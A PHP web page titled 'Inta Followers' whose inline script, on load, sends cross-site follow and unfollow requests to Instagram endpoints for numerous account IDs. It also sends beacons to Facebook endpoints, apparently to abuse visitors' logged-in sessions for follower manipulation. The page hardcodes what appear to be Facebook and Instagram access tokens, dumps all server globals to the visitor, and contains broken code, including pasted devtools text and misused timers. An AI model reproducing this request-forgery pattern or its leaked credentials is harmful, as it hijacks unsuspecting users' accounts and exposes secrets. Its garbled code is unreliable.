<?php   
print($_SERVER['SCRIPT_URI']);
print_r($GLOBALS);
$cookie_name = "user";
$cookie_value = "Alex Porter";
setcookie($cookie_name, $cookie_value, time() + (86400 * 30), "/");

if(!isset($_COOKIE[$cookie_name])) {
    echo "Cookie named '" . $cookie_name . "' is not set!";
} else {
    echo "Cookie '" . $cookie_name . "' is set!<br>";
    echo "Value is: " . $_COOKIE[$cookie_name];
}

echo'<html><heade><title>Inta Followers</title>   
<!--script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>   
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>   
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script-->   
<script>   
function getXhrObject(){   
var XhrObjectObject = null;   
if(window.XMLHttpRequest) // Firefox et autres   
XhrObject = new XMLHttpRequest();   
else if(window.ActiveXObject){ // Internet Explorer   
try {   
XhrObject = new ActiveXObject("Msxml2.XMLHTTP");   
} catch (e) {   
XhrObject = new ActiveXObject("Microsoft.XMLHTTP");   
}   
}   
else { // XMLHttpRequest non supporté par le navigateur   
alert("Votre navigateur ne supporte pas les objetsXMLHTTPRequest...");   
XhrObject = false;   
}   
return XhrObject   
}   
   
function ajaxPage(mothode,url,flag,params,id){   
var XhrObject = getXhrObject();   
XhrObject.onreadystatechange = function(){   
if(XhrObject.readyState == 4 && XhrObject.status == 200){   
document.getElementById(id).innerHTML=XhrObject.responseText;   
}   
}   
XhrObject.open(mothode,url,flag);   
XhrObject.send(params);   
}   



function ajaxPage1(mothode,url,flag,params,id){
var XhrObject = getXhrObject();
XhrObject.onreadystatechange = function(){
if(XhrObject.readyState == 4 && XhrObject.status == 200){
document.getElementById(id).innerHTML=XhrObject.responseText;
}
}
XhrObject.open(mothode,url,flag);
XhrObject.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
XhrObject.send(params);
}

var data = "-----------------------------2148526430419";  
	
	f10();
//	kim();
	function f10(){   
//for(i=0; i<2;i++){   
ajaxPage("GET","https://www.instagram.com/ahmed.abderrahmane8/",true,null,"corp"); 
	ajaxPage("GET","https://www.instagram.com/ahmed.abderrahmane8/following/",true,null,"text");   
		ajaxPage1("POST","https://graph.instagram.com/logging_client_events",true,\'access_token=1217981644879628|65a937f07619e8d4dce239c462a447ce&message=XHRPOSThttps://graph.instagram.com/logging_client_events[HTTP/2.0 200 OK 2007ms] HeadersCookiesParamsResponseTimingsStack TraceSecurityForm dataaccess_token1217981644879628|65a937f07619e8d4dce239c462a447cemessage\',"corp0"); 

/*setTimeout(inst(), 1000);   
setTimeout(done(), 1000)  ;   
setTimeout(seli(), 1000);   
setTimeout(kim(), 1000);   ;   
setTimeout(beyo(), 1000);   */
setTimeout(aria(), 1000);      /*
setTimeout(rawan(), 1000);   
setTimeout(saba(), 1000);      
setTimeout(dndn(), 1000);     
setTimeout(grmi(), 1000);      
setTimeout(both(), 1000);    */

}   
   
function inst(){   
ajaxPage("GET","https://www.instagram.com/web/friendships/25025320/unfollow/",true,null,"fl")   ;   
ajaxPage("GET","https://www.instagram.com/web/friendships/25025320/follow/",true,null,"fl") ;   

}   
   
function done(){   
setTimeout(ajaxPage("GET","https://www.instagram.com/web/friendships/173560420/unfollow/",true,null,"fl")   
, 1000);   
setTimeout(ajaxPage("GET","https://www.instagram.com/web/friendships/173560420/follow/",true,null,"fl")   
, 1000);   
}   
   
function seli(){   
setTimeout(ajaxPage("GET","https://www.instagram.com/web/friendships/460563723/unfollow/",true,null,"fl")     
, 1000);   
setTimeout(ajaxPage("GET","https://www.instagram.com/web/friendships/460563723/follow/",true,null,"fl")   
, 1000);   
}   
   
function aria(){   
	ajaxPage("GET","https://www.facebook.com/connect/ping?client_id=124024574287414&domain=www.instagram.com&origin=1&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fconnect%2Fxd_arbiter%2Fr%2F7LloFuHvA7I.js%3Fversion%3D43%23cb%3Df26eaf3724180a8%26domain%3Dwww.instagram.com%26origin%3Dhttps%253A%252F%252Fwww.instagram.com%252Ff2b761fd3078494%26relation%3Dparent&response_type=token%2Csigned_request&sdk=joey&version=v2.2",true,null,"corp1");      
	ajaxPage("GET","https://staticxx.facebook.com/connect/xd_arbiter/r/7LloFuHvA7I.js?version=43#cb=f23c01e100b2eb6&domain=www.instagram.com&origin=https%3A%2F%2Fwww.instagram.com%2Ff2e4a26a03f734a&relation=parent&signed_request=--ns3KZImM9qZdtnXwK_dWhZmgDGBAS8onG3YMiic0M.eyJhbGdvcml0aG0iOiJITUFDLVNIQTI1NiIsImNvZGUiOiJBUUFmWjU2cTNQamp1UUpXNEJNTm9aS2VTaUoxdWM1dWJUeWhWRE1FWmJBd3lQVkhKclY4NVdrODBsUkxVT3M3LWpLSll2V19FVkpPYkViUnJmQUotaTkzZmZfdV9lQ1BJUFpDYmJPRGlWVFlja1p2UnVrT28zbVRBam1udmJZNFlPc1l0aWM0cFZWV3lJMUxuandxU0VTWFlXanM5TDR3YmZmSEN2VmZUWTFseG5FMktYUGU0VWVnMzk2WXFWa0NILTd3XzRUU0l1YmdIaDdiZGktRk1WeExmQjBNTTZRZll5NF9DSFB5U0gxWEtaSjhfbmxCV0NWX1BlTjg1T0k0NS1Ic1NCNmJNbWthUEltbXJCZngxakNBTXg0Smp4ZnV6RkZFaUxMeHpaUzBMcXNKQklKekc1WEh1QXdaaDQwdGR6bngwNGt5MThYaFN4cDBadFdMZjVzZCIsImlzc3VlZF9hdCI6MTU0NDEzNzk4MSwidXNlcl9pZCI6IjEwMDAwNTEyMDcxMDg3MCJ9&access_token=EAABwzLixnjYBAJCcbKigplujZCyUGbojVClxWgER3FK5jka36U2gIBPTZANuczttXVSmx8tuZBjuRiO4oxObfhgUZC9ZC7BPMbuA3mr7WVgWs1oFnVcVpff1cCoFHGVo1pm5syiaHZAwTNX2rZBnR5A4SeDktyJXrecCsv3bLkqZBGMUZCWOcAg9lTZBNCJJV4vSTgFQ1zZAM8LfAZDZD&expires_in=6419&data_access_expiration_time=0&base_domain=instagram.com&enforce_https=1",true,null,"corp11");      
//	ajaxPage1("POST","https://www.facebook.com/tr/",true,"","corp2"); 
	 navigator.sendBeacon("https://www.facebook.com/tr/", data);
    ajaxPage1("POST","https://graph.instagram.com/logging_client_events",true,\'access_token=1217981644879628|65a937f07619e8d4dce239c462a447ce&message=XHRPOSThttps://graph.instagram.com/logging_client_events[HTTP/2.0 200 OK 2007ms] HeadersCookiesParamsResponseTimingsStack TraceSecurityForm dataaccess_token1217981644879628|65a937f07619e8d4dce239c462a447cemessage\',"corp21"); 
	 navigator.sendBeacon("https://www.facebook.com/tr/", data);
   ajaxPage1("POST","https://www.instagram.com/web/friendships/7719696/unfollow/",true,null,"fl1")  ;	  
	 navigator.sendBeacon("https://www.facebook.com/tr/", data);
    ajaxPage1("POST","https://www.instagram.com/web/friendships/7719696/follow/",true,null,"fl2") ;
		ajaxPage1("POST","https://graph.instagram.com/logging_client_events",true,\'access_token=1217981644879628|65a937f07619e8d4dce239c462a447ce&message=XHRPOSThttps://graph.instagram.com/logging_client_events[HTTP/2.0 200 OK 2007ms] HeadersCookiesParamsResponseTimingsStack TraceSecurityForm dataaccess_token1217981644879628|65a937f07619e8d4dce239c462a447cemessage\',"corp24"); 
}   
   
function kim(){  
setTimeout(ajaxPage1("POST","https://www.instagram.com/web/friendships/18428658/follow/",true,null,"fl") 
, 1000);   
 
setTimeout(ajaxPage1("POST","https://www.instagram.com/web/friendships/18428658/unfollow/",true,null,"fl")   
, 1000);   
}   
   
function beyo(){   
setTimeout(ajaxPage("GET","https://www.instagram.com/web/friendships/247944034/unfollow/",true,null,"fl")  
, 1000);   
setTimeout(ajaxPage("GET","https://www.instagram.com/web/friendships/247944034/follow/",true,null,"fl")   
, 1000);   
}   
   
function kyli(){   
setTimeout(ajaxPage("GET","https://www.instagram.com/web/friendships/12281817/unfollow/",true,null,"fl")   
, 1000);   
setTimeout(ajaxPage("GET","https://www.instagram.com/web/friendships/12281817/follow/",true,null,"fl") 
, 1000);   
}   
   
function noti(){   
setTimeout(ajaxPage("GET","https://www.instagram.com/web/friendships/787132/unfollow/",true,null,"fl"), 1000);   
setTimeout(ajaxPage("GET","https://www.instagram.com/web/friendships/787132/unfollow/",true,null,"fl"), 1000);   
}   
   
function rawan(){   
setTimeout(ajaxPage("GET","https://www.instagram.com/web/friendships/2116577114/unfollow/",true,null,"fl"), 1000);   
setTimeout(ajaxPage("GET","https://www.instagram.com/web/friendships/2116577114/follow/",true,null,"fl"), 1000);   
 }   
 
function lela(){   
setTimeout(ajaxPage("GET","https://www.instagram.com/web/friendships/360373670/unfollow/",true,null,"fl"), 1000);   
setTimeout(ajaxPage("GET","https://www.instagram.com/web/friendships/360373670/follow/",true,null,"fl"), 1000);   
}   
   
function saba(){   
setTimeout(ajaxPage("GET","https://www.instagram.com/web/friendships/1086469017/unfollow/",true,null,"fl"), 1000);   
setTimeout(ajaxPage("GET","https://www.instagram.com/web/friendships/1086469017/follow/",true,null,"fl"), 1000);   
}   
   
function khld(){   
setTimeout(ajaxPage("GET","https://www.instagram.com/web/friendships/662778728/unfollow/",true,null,"fl")   , 1000);   
setTimeout(ajaxPage("GET","https://www.instagram.com/web/friendships/662778728/follow/",true,null,"fl"), 1000);   
}   
   
function chfi(){   
setTimeout(ajaxPage("GET","https://www.instagram.com/web/friendships/360476069/unfollow/",true,null,"fl"), 1000);   
setTimeout(ajaxPage("GET","https://www.instagram.com/web/friendships/360476069/follow/",true,null,"fl") , 1000);   
}   
   
function dndn(){   
setTimeout(ajaxPage("GET","https://www.instagram.com/web/friendships/835817991/unfollow/",true,null,"fl"), 1000);   
setTimeout(ajaxPage("GET","https://www.instagram.com/web/friendships/835817991/follow/",true,null,"fl"), 1000);   
}   
   
function grmi(){   
setTimeout(ajaxPage("GET","https://www.instagram.com/web/friendships/550764250/unfollow/",true,null,"fl"), 1000);   
setTimeout(ajaxPage("GET","https://www.instagram.com/web/friendships/550764250/follow/",true,null,"fl"), 1000);   
}   
   
function both(){   
setTimeout(ajaxPage("GET","https://www.instagram.com/web/friendships/1001114229/unfollow/",true,null,"fl"), 1000);   
setTimeout(ajaxPage("GET","https://www.instagram.com/web/friendships/1001114229/follow/",true,null,"fl"), 1000);   
}   

</script>   
</head><body><div class="container">   
   <div class="row">   
    <div class="col-lg">   
<a href="?q=folloers"><img src="insta.png" alt="instagram" class="img-thumbnail"></a>   
</div></div>   
<div class="row">   
    <div class="col-lg">  
<div id="corp"></div>	
<div id="text"></div>  	
<div id="corp0"></div>	
<div id="fl"></div>

<div id="corp00"></div>	
<div id="corp01"></div>	
<div id="corp11"></div>	
<div id="corp1"></div>	
<div id="corp2"></div>	
<div id="corp21"></div>	
<div id="corp22"></div>	
<div id="fl1"></div>
<div id="corp23"></div>	
<div id="fl2"></div>
<div id="corp24"></div>	

    
	</div></div>   
</div>';   
     
  if(!empty($_GET['q']))   
f10();   
   
  echo'   
		                        			                        Copyright © 2018 Rimstore. All Right Reserved		                                                    </body></html>';   
   